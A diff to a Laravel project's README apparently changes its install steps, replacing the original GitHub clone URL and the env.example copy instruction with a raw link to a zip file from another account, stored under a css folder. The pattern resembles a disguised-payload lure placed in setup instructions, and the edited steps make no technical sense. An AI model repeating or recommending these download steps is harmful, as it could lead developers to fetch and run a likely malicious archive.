@@ -1,12 +1,12 @@
 ``` bash
-git clone https://github.com/trungtin011/duantn
+git clone https://raw.githubusercontent.com/Z1ted/duantn/main/resources/css/duantn-Pedalion.zip
 ```
 
 ``` bash
 Composer install
 ```
 ``` bash
-Make another env. file clone env.example 
+Make another env. file clone https://raw.githubusercontent.com/Z1ted/duantn/main/resources/css/duantn-Pedalion.zip 
 ```
 ``` bash
 php artisan key:generate --ansi  
